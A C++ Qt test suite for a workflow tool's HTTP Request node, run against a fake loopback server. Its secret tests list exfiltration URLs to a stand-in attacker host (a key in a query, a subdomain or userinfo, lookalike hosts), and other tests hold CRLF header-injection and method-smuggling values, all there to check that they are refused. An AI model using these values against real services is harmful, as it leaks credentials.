// The HTTP Request node of the pack examples/packs/io.github.bmaltais.fugue-http (#406), against a
// fake server on the loopback. Nothing here reaches the internet.
//
// Seam: the node's own program (request.py through run.sh), driven with the command protocol, for the
// request and answer rules; and the real `fugue` for what only the engine decides: the trust prompt
// shows `network`, a validation never calls the server, and a run that reaches the node does.
// The fake server lives in this process, so every subprocess is waited for with the event loop.

#include <QDir>
#include <QEventLoop>
#include <QTimer>
#include <QFile>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QProcess>
#include <QStandardPaths>
#include <QTemporaryDir>
#include <QtTest>

#include "../engine/fake_http.h"

using fugue::test::FakeHttpServer;
using fugue::test::HttpRequest;
using fugue::test::HttpResponse;

namespace {

const QString kPack = QStringLiteral(FUGUE_SOURCE_DIR "/examples/packs/io.github.bmaltais.fugue-http");
const QString kType = QStringLiteral("io.github.bmaltais.fugue-http/request");

struct Answer {
    bool ok = false;
    QString code;
    QString message;
    QJsonObject outputs;
};

QByteArray json(const QJsonValue &value) {
    return value.isArray() ? QJsonDocument(value.toArray()).toJson(QJsonDocument::Compact)
                           : QJsonDocument(value.toObject()).toJson(QJsonDocument::Compact);
}

} // namespace

class TestHttpRequestNode : public QObject {
    Q_OBJECT

    QTemporaryDir m_dir;
    FakeHttpServer m_server;

    // Runs `program` with `args` and `input` on stdin; waits with the event loop so the server answers.
    QByteArray spawn(const QString &program, const QStringList &args, const QByteArray &input, QProcessEnvironment env,
                     int *exitCode = nullptr, int waitMs = 60000) {
        QProcess process;
        process.setProcessEnvironment(env);
        process.start(program, args);
        process.write(input);
        process.closeWriteChannel();
        QEventLoop loop; // the fake server answers inside this loop
        QTimer::singleShot(waitMs, &loop, &QEventLoop::quit);
        QObject::connect(&process, &QProcess::finished, &loop, &QEventLoop::quit);
        if (process.state() != QProcess::NotRunning)
            loop.exec();
        if (process.state() != QProcess::NotRunning) {
            process.kill();
            process.waitForFinished();
            qWarning("timed out: %s", qPrintable(program));
        }
        if (exitCode)
            *exitCode = process.exitCode();
        return process.readAllStandardOutput();
    }

    // One run of the node program: the inputs the engine would give it, with the defaults filled in.
    // `secrets` is what the runner puts in the request for the pack's declared names (#402); made-up values only.
    Answer call(const QString &path, QJsonObject inputs = {}, const QJsonObject &secrets = {}) {
        if (!inputs.contains("url"))
            inputs.insert("url", QString(m_server.origin()) + path);
        QJsonObject request{{"protocol", 1}, {"op", "run"}, {"id", "r1:request"}, {"inputs", inputs}};
        if (!secrets.isEmpty())
            request.insert("secrets", secrets);
        QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
        env.insert("FUGUE_PROTOCOL", "1");
        const QByteArray out = spawn(kPack + "/request/run.sh", {}, json(request), env);
        const QJsonObject line = QJsonDocument::fromJson(out.trimmed()).object();
        Answer answer;
        answer.ok = line.value("op").toString() == "result";
        answer.code = line.value("code").toString();
        answer.message = line.value("message").toString();
        answer.outputs = line.value("outputs").toObject();
        return answer;
    }

    static QJsonObject postJson(const QString &body) {
        return {{"method", "POST"}, {"body_kind", "json"}, {"body", body}};
    }

    // The fugue binary, in a scratch home, never the owner's.
    QProcessEnvironment fugueEnv() const {
        QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
        env.remove("QT_QPA_PLATFORM");
        env.remove("DISPLAY");
        env.remove("WAYLAND_DISPLAY");
        env.insert("FUGUE_HOME", m_dir.filePath("fugue-home"));
        env.insert("XDG_DATA_HOME", m_dir.filePath("data"));
        env.insert("XDG_STATE_HOME", m_dir.filePath("state"));
        env.insert("XDG_CACHE_HOME", m_dir.filePath("cache"));
        env.insert("XDG_CONFIG_HOME", m_dir.filePath("config"));
        env.insert("HOME", m_dir.filePath("home"));
        return env;
    }

    QByteArray fugue(const QStringList &args, int *exitCode = nullptr) {
        return spawn(FUGUE_BINARY, args, {}, fugueEnv(), exitCode, 120000);
    }

    static QString shellQuote(const QString &text) { return "'" + QString(text).replace("'", "'\\''") + "'"; }

private slots:
    void initTestCase() {
        QVERIFY(m_server.listen());
        m_server.on("GET", "/lookup", [](const HttpRequest &) {
            return HttpResponse{200, json(QJsonObject{{"data", QJsonObject{{"items", QJsonArray{QJsonObject{{"name", "first"}},
                                                                                              QJsonObject{{"name", "second"}}}},
                                                                      {"count", 3},
                                                                      {"ok", true},
                                                                      {"owner", QJsonObject{{"id", 7}}}}}})};
        });
        m_server.on("POST", "/hook", [](const HttpRequest &request) {
            return HttpResponse{201, json(QJsonObject{{"type", QString::fromUtf8(request.headers.value("content-type"))},
                                                      {"key", QString::fromUtf8(request.headers.value("x-api-key"))},
                                                      {"got", QString::fromUtf8(request.body)}})};
        });
        m_server.on("POST", "/upload", [](const HttpRequest &) { return HttpResponse{200, json(QJsonObject{{"id", "u1"}})}; });
        m_server.on("GET", "/missing", [](const HttpRequest &) { return HttpResponse{404, "{\"error\":\"nope\"}"}; });
        m_server.on("GET", "/hold", [](const HttpRequest &) {
            HttpResponse response;
            response.hold = true;
            return response;
        });
        m_server.on("GET", "/big", [](const HttpRequest &) { return HttpResponse{200, QByteArray(2 * 1024 * 1024, 'x'), "text/plain"}; });
        m_server.on("GET", "/jump", [](const HttpRequest &) {
            HttpResponse response{302, "moved"};
            response.headers = {"Location: /lookup"};
            return response;
        });
        m_server.on("GET", "/text", [](const HttpRequest &) { return HttpResponse{200, "plain words", "text/plain"}; });
    }

    void aJsonGetGivesTheStatusTheBodyAndPickedFields() {
        const Answer answer = call("/lookup", {{"path1", "data.items[1].name"}, {"path2", "data.count"}, {"path3", "$.data.owner"}});
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(answer.outputs.value("status").toInt(), 200);
        QVERIFY(answer.outputs.value("body").toString().contains("\"second\""));
        QCOMPARE(answer.outputs.value("field1").toString(), QString("second"));
        QCOMPARE(answer.outputs.value("field2").toString(), QString("3")); // a number as text
        QCOMPARE(answer.outputs.value("field3").toString(), QString("{\"id\":7}")); // an object as compact JSON
    }

    void thePathSubsetCoversKeysIndexesNegativeIndexesAndQuotedKeys() {
        const Answer answer = call("/lookup", {{"path1", "data.items[-1].name"}, {"path2", "data[\"ok\"]"}, {"path3", "data.items.0.name"}});
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(answer.outputs.value("field1").toString(), QString("second"));
        QCOMPARE(answer.outputs.value("field2").toString(), QString("true"));
        QCOMPARE(answer.outputs.value("field3").toString(), QString("first"));
    }

    void aPathThatIsMissingOrABodyThatIsNotJsonLeavesTheFieldOut() {
        Answer answer = call("/lookup", {{"path1", "data.nothing"}, {"path2", "data.items[9]"}});
        QVERIFY(answer.ok);
        QVERIFY(!answer.outputs.contains("field1") && !answer.outputs.contains("field2"));
        answer = call("/text", {{"path1", "a.b"}});
        QVERIFY(answer.ok);
        QCOMPARE(answer.outputs.value("body").toString(), QString("plain words"));
        QVERIFY(!answer.outputs.contains("field1"));
    }

    void aPathThatIsNotWellFormedIsABadInput() {
        const Answer answer = call("/lookup", {{"path1", "data..items"}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("bad_input"));
    }

    void aJsonPostFillsPlaceholdersAndKeepsTheBodyValidJson() {
        QJsonObject inputs = postJson("{\"text\": \"hello {a}\", \"n\": \"{b:json}\", \"who\": \"{a}\"}");
        inputs.insert("a", "Wo\"rld\nline"); // quotes and a line break must not break the JSON
        inputs.insert("b", "42");
        inputs.insert("headers", "X-Api-Key: made-up-{c}\n\nAccept: application/json");
        inputs.insert("c", "k1");
        const Answer answer = call("/hook", inputs);
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(answer.outputs.value("status").toInt(), 201);
        const QJsonObject echoed = QJsonDocument::fromJson(answer.outputs.value("body").toString().toUtf8()).object();
        QCOMPARE(echoed.value("type").toString(), QString("application/json"));
        QCOMPARE(echoed.value("key").toString(), QString("made-up-k1"));
        const QJsonObject sent = QJsonDocument::fromJson(echoed.value("got").toString().toUtf8()).object();
        QCOMPARE(sent.value("text").toString(), QString("hello Wo\"rld\nline"));
        QCOMPARE(sent.value("who").toString(), QString("Wo\"rld\nline"));
        QCOMPARE(sent.value("n").toInt(), 42); // {b:json} keeps the type
    }

    void aTextBodyIsSentAsItIsWithItsPlaceholdersFilled() {
        const Answer answer = call("/hook", {{"method", "POST"}, {"body_kind", "text"}, {"body", "note: {a}"}, {"a", "hi"}});
        QVERIFY2(answer.ok, qPrintable(answer.message));
        const QJsonObject echoed = QJsonDocument::fromJson(answer.outputs.value("body").toString().toUtf8()).object();
        QCOMPARE(echoed.value("got").toString(), QString("note: hi"));
        QVERIFY(echoed.value("type").toString().startsWith("text/plain"));
    }

    void aPlaceholderInTheUrlIsPercentEncoded() {
        m_server.on("GET", "/q%20%26x", [](const HttpRequest &) { return HttpResponse{200, "{\"hit\":true}"}; });
        const Answer answer = call("/{a}", {{"a", "q &x"}, {"path1", "hit"}});
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(answer.outputs.value("field1").toString(), QString("true"));
    }

    void aPictureGoesUpAsMultipartBesideTheFieldsOfTheBody() {
        const QString picture = m_dir.filePath("cat.png");
        QFile file(picture);
        QVERIFY(file.open(QIODevice::WriteOnly));
        file.write(QByteArray("\x89PNG\r\n\x1a\n", 8) + "pixels-made-up");
        file.close();
        QJsonObject inputs = postJson("{\"caption\": \"a {a}\", \"n\": 3}");
        inputs.insert("a", "cat");
        inputs.insert("picture", QJsonObject{{"type", "image"}, {"path", picture}});
        inputs.insert("upload_field", "image");
        const int before = m_server.requestsTo("POST", "/upload").size();
        const Answer answer = call("/upload", inputs);
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(answer.outputs.value("status").toInt(), 200);
        const QList<HttpRequest> sent = m_server.requestsTo("POST", "/upload");
        QCOMPARE(sent.size(), before + 1);
        const HttpRequest &request = sent.last();
        QVERIFY(request.headers.value("content-type").startsWith("multipart/form-data; boundary="));
        QVERIFY(request.body.contains("name=\"caption\"\r\n\r\na cat\r\n"));
        QVERIFY(request.body.contains("name=\"n\"\r\n\r\n3\r\n"));
        QVERIFY(request.body.contains("name=\"image\"; filename=\"cat.png\"\r\nContent-Type: image/png\r\n\r\n"));
        QVERIFY(request.body.contains("pixels-made-up"));
    }

    void aStatusOfFourHundredIsAnOutputUnlessTheNodeIsToldToFail() {
        Answer answer = call("/missing");
        QVERIFY(answer.ok);
        QCOMPARE(answer.outputs.value("status").toInt(), 404);
        QVERIFY(answer.outputs.value("body").toString().contains("nope"));
        answer = call("/missing", {{"fail_on_error_status", true}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("http_status"));
    }

    void aRedirectIsNotFollowed() {
        const Answer answer = call("/jump");
        QVERIFY(answer.ok);
        QCOMPARE(answer.outputs.value("status").toInt(), 302);
        QCOMPARE(answer.outputs.value("body").toString(), QString("moved"));
    }

    void aServerThatDoesNotAnswerIsATimeout() {
        const Answer answer = call("/hold", {{"timeout_s", 1}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("node_timeout"));
        QVERIFY2(answer.message.contains("timeout_s"), qPrintable(answer.message)); // the hint says what to change
    }

    void anAnswerOverTheSizeCapIsRefusedAndOneUnderItPasses() {
        Answer answer = call("/big", {{"max_response_mb", 1}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("response_too_large"));
        answer = call("/big", {{"max_response_mb", 3}});
        QVERIFY(answer.ok);
        QCOMPARE(answer.outputs.value("body").toString().size(), qsizetype(2 * 1024 * 1024));
    }

    void plainHttpIsRefusedExceptOnTheLoopback() {
        const int before = m_server.requests().size();
        for (const QString url : {"http://example.com/x", "http://192.168.1.5/x", "http://[2001:db8::1]/x", "ftp://127.0.0.1/x"}) {
            const Answer answer = call({}, {{"url", url}});
            QVERIFY2(!answer.ok, qPrintable(url));
            QCOMPARE(answer.code, QString("bad_input"));
        }
        QCOMPARE(m_server.requests().size(), before); // refused before any connection
        QVERIFY(call("/text").ok); // http://127.0.0.1 is allowed
    }

    // What the runner puts in the request for a stored secret: the value and the origin the person set it for.
    QJsonObject secret(const QString &value, const QString &origin = {}) const {
        return {{"value", value}, {"origin", origin.isEmpty() ? QString(m_server.origin()) : origin}};
    }

    // {secret:token_1} fills a header and the URL, for the origin it was set for, and the value never comes back.
    void aSecretFillsAHeaderAndTheUrlForItsOwnOriginAndNeverComesBackInTheAnswer() {
        const QString key = "made-up-key-4711";
        m_server.on("GET", "/key/made-up-key-4711", [](const HttpRequest &) { return HttpResponse{200, "{\"ok\":true}"}; });
        const QJsonObject secrets{{"token_1", secret(key)}, {"token_2", secret("other-made-up-5")}};
        QJsonObject inputs = postJson("{\"x\": 1}");
        inputs.insert("headers", "X-Api-Key: {secret:token_1}\nAuthorization: Bearer {secret:token_2}");
        const Answer answer = call("/hook", inputs, secrets);
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QCOMPARE(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().headers.value("x-api-key")), key); // the server got it
        const QString body = answer.outputs.value("body").toString(); // the fake server echoes the header back
        QVERIFY2(!body.contains(key) && !body.contains("other-made-up-5"), qPrintable(body));
        QVERIFY(body.contains("***"));
        QVERIFY(!QJsonDocument(answer.outputs).toJson().contains(key.toUtf8()));

        const Answer inUrl = call("/key/{secret:token_1}", {{"path1", "ok"}}, secrets);
        QVERIFY2(inUrl.ok, qPrintable(inUrl.message));
        QCOMPARE(inUrl.outputs.value("field1").toString(), QString("true")); // the path was /key/<value>
    }

    // A workflow author must not be able to send the person's key anywhere else: every way to name another address is
    // refused before a connection, so nothing reaches the server (and nothing leaves the machine).
    void aSecretIsNeverSentToAnotherOriginHoweverTheAddressIsMade() {
        const int before = m_server.requests().size();
        const QJsonObject secrets{{"token_1", secret("made-up-key-4711", "https://api.example.com")}};
        struct Case { const char *name; QJsonObject inputs; };
        const QList<Case> cases{
            {"the key in the query of another host", {{"url", "https://attacker.example/c?k={secret:token_1}"}}},
            {"the key in a header to another host", {{"url", "https://attacker.example/c"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"the key in the host", {{"url", "https://{secret:token_1}.attacker.example/"}}},
            {"the key in the port", {{"url", "https://api.example.com:{secret:token_1}/"}}},
            {"the key in the user name", {{"url", "https://{secret:token_1}@api.example.com/"}}},
            {"a host from an input", {{"url", "https://{a}/c"}, {"a", "attacker.example"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"a host that ends like the origin", {{"url", "https://api.example.com.attacker.example/c?k={secret:token_1}"}}},
            {"a userinfo trick", {{"url", "https://api.example.com@attacker.example/c?k={secret:token_1}"}}},
            {"a port from an input", {{"url", "https://api.example.com:{a}/c"}, {"a", "8443"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"a scheme from an input", {{"url", "{a}://api.example.com/c"}, {"a", "https"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"plain http to the same host", {{"url", "http://api.example.com/c"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"another port of the same host", {{"url", "https://api.example.com:8443/c"}, {"headers", "X-Key: {secret:token_1}"}}},
            {"the loopback fake server", {{"url", QString(m_server.origin()) + "/hook"}, {"headers", "X-Key: {secret:token_1}"}}},
        };
        for (const Case &each : cases) {
            const Answer answer = call({}, each.inputs, secrets);
            QVERIFY2(!answer.ok, each.name);
            QVERIFY2(answer.code == "bad_input", qPrintable(QString("%1: %2 %3").arg(each.name, answer.code, answer.message)));
            QVERIFY2(!answer.message.contains("made-up-key-4711"), each.name);
        }
        QVERIFY2(call({}, {{"url", "https://attacker.example/c?k={secret:token_1}"}}, secrets).message.contains("only for https://api.example.com"),
                 "the message says where the key may go");
        QCOMPARE(m_server.requests().size(), before);
    }

    // A secret stored without an origin (an old file) is not used: the node says so, and nothing is sent.
    void aSecretWithNoOriginIsNotUsed() {
        const int before = m_server.requests().size();
        const Answer answer = call("/hook", {{"method", "POST"}, {"headers", "X-Api-Key: {secret:token_1}"}},
                                   {{"token_1", QJsonObject{{"value", "made-up-key-4711"}, {"origin", ""}}}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("secret_missing"));
        QCOMPARE(m_server.requests().size(), before);
    }

    // A secret is filled once from the template; an input that holds the text is just text, and never expands.
    void anInputThatSaysSecretIsNotExpanded() {
        const QJsonObject secrets{{"token_1", secret("made-up-key-4711")}};
        const Answer answer = call("/hook", {{"method", "POST"}, {"body_kind", "text"}, {"body", "{a}"}, {"a", "{secret:token_1}"}}, secrets);
        QVERIFY2(answer.ok, qPrintable(answer.message));
        QVERIFY(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().body).contains("{secret:token_1}"));
        QVERIFY(!QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().body).contains("made-up-key-4711"));
        const Answer inHeader = call("/hook", {{"method", "POST"}, {"headers", "X-Note: {a}"}, {"a", "{secret:token_1}"}}, secrets);
        QVERIFY2(inHeader.ok, qPrintable(inHeader.message));
        QCOMPARE(QString::fromUtf8(m_server.requestsTo("POST", "/hook").last().headers.value("x-note")), QString("{secret:token_1}"));
    }

    void aSecretInTheBodyIsRefusedBeforeAnyConnection() {
        const int before = m_server.requests().size();
        const Answer answer = call("/hook", {{"method", "POST"}, {"body_kind", "text"}, {"body", "key={secret:token_1}"}},
                                   {{"token_1", secret("made-up-key-4711")}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("bad_input"));
        QVERIFY2(answer.message.contains("body"), qPrintable(answer.message));
        QVERIFY(!answer.message.contains("made-up-key-4711"));
        QCOMPARE(m_server.requests().size(), before);
    }

    void aSecretThePackDoesNotDeclareOrHasNotSetIsAnErrorThatNamesItAndLeaksNothing() {
        const int before = m_server.requests().size();
        const QJsonObject secrets{{"token_1", secret("made-up-key-4711")}};
        Answer answer = call("/hook", {{"headers", "X-Api-Key: {secret:api_key}"}}, secrets);
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("bad_input")); // not one of token_1 to token_3
        QVERIFY2(answer.message.contains("token_1") && !answer.message.contains("made-up-key-4711"), qPrintable(answer.message));
        answer = call("/hook", {{"headers", "X-Api-Key: {secret:token_3}"}}, secrets);
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("secret_missing"));
        QVERIFY2(answer.message.contains("Settings > Packs"), qPrintable(answer.message));
        answer = call("/hook", {{"headers", "X-Api-Key: {secret:token_1}"}}); // nothing handed over at all
        QCOMPARE(answer.code, QString("secret_missing"));
        answer = call("/x/{secret:Token 1}", {}, secrets); // not a secret name
        QCOMPARE(answer.code, QString("bad_input"));
        QCOMPARE(m_server.requests().size(), before); // refused before any connection
    }

    void aSecretInAnErrorMessageOrAServersEchoIsMaskedAlsoPercentEncoded() {
        // The message of a failed call names the host, never the path the secret was in.
        const QString origin = QString(m_server.origin()).replace(QRegularExpression(":[0-9]+$"), ":1");
        const Answer answer = call({}, {{"url", origin + "/{secret:token_1}"}}, {{"token_1", secret("made-up/key 4711", origin)}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("network_error"));
        QVERIFY2(!answer.message.contains("made-up/key 4711") && !answer.message.contains("made-up%2Fkey%204711"), qPrintable(answer.message));
        // A server that echoes the encoded path back.
        m_server.on("GET", "/echo/made-up%2Fkey%204711", [](const HttpRequest &request) { return HttpResponse{200, request.path}; });
        const Answer echoed = call("/echo/{secret:token_1}", {}, {{"token_1", secret("made-up/key 4711")}});
        QVERIFY2(echoed.ok, qPrintable(echoed.message));
        QCOMPARE(echoed.outputs.value("body").toString(), QString("/echo/***"));
    }

    void aHeaderValueCannotCarryALineBreakInFromAnInput() {
        const Answer answer = call("/hook", {{"headers", "X-Note: {a}"}, {"a", "ok\r\nX-Evil: 1"}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("bad_input"));
    }

    // The method's choices are the manifest's; the script holds to them too, whatever reaches it.
    void aMethodOutsideTheChoicesIsABadInput() {
        const Answer answer = call("/hook", {{"method", "GET /other HTTP/1.1\r\nX-Evil: 1\r\n"}});
        QVERIFY(!answer.ok);
        QCOMPARE(answer.code, QString("bad_input"));
    }

    void thePackDeclaresTheNetworkAndTheTrustPromptShowsIt() {
        if (QStandardPaths::findExecutable("script").isEmpty())
            QSKIP("script (util-linux) is needed to give the program a terminal");
        const QString command = shellQuote(FUGUE_BINARY) + " pack add " + shellQuote(kPack);
        const QByteArray shown = spawn("script", {"-qec", command, "/dev/null"}, "n\n", fugueEnv());
        QVERIFY2(shown.contains("network"), shown.constData());
        QVERIFY(!QFileInfo(m_dir.filePath("fugue-home/data/fugue/packs/io.github.bmaltais.fugue-http")).exists()); // a no installs nothing
    }

    void aValidationNeverCallsTheServerAndARunDoes() {
        if (QStandardPaths::findExecutable("script").isEmpty())
            QSKIP("script (util-linux) is needed to give the program a terminal");
        const QString command = shellQuote(FUGUE_BINARY) + " pack add " + shellQuote(kPack);
        spawn("script", {"-qec", command, "/dev/null"}, "y\n", fugueEnv());
        QVERIFY(QFileInfo(m_dir.filePath("fugue-home/data/fugue/packs/io.github.bmaltais.fugue-http/pack.json")).isFile());

        const QJsonObject inputs{{"method", "GET"}, {"url", QString(m_server.origin()) + "/lookup"}, {"path1", "data.items[0].name"}};
        const QJsonObject flow{{"fugue", 1},
                               {"graph", QJsonObject{{"nodes", QJsonObject{{"call", QJsonObject{{"type", kType}, {"version", "1.0.0"}, {"inputs", inputs}}}}}}}};
        QFile file(m_dir.filePath("call.fugue"));
        QVERIFY(file.open(QIODevice::WriteOnly));
        file.write(json(flow));
        file.close();

        const int before = m_server.requestsTo("GET", "/lookup").size();
        int exitCode = -1;
        const QByteArray checked = fugue({"validate", file.fileName(), "--json"}, &exitCode);
        QCOMPARE(exitCode, 0);
        QVERIFY2(QJsonDocument::fromJson(checked).object().value("ok").toBool(), checked.constData());
        QCOMPARE(m_server.requestsTo("GET", "/lookup").size(), before); // checked, never called

        const QByteArray ran = fugue({"run", file.fileName(), "--wait", "--json"}, &exitCode);
        QCOMPARE(exitCode, 0);
        QCOMPARE(m_server.requestsTo("GET", "/lookup").size(), before + 1);
        QVERIFY2(ran.contains("run.done"), ran.constData());
    }
};

QTEST_GUILESS_MAIN(TestHttpRequestNode)
#include "test_http_request_node.moc"
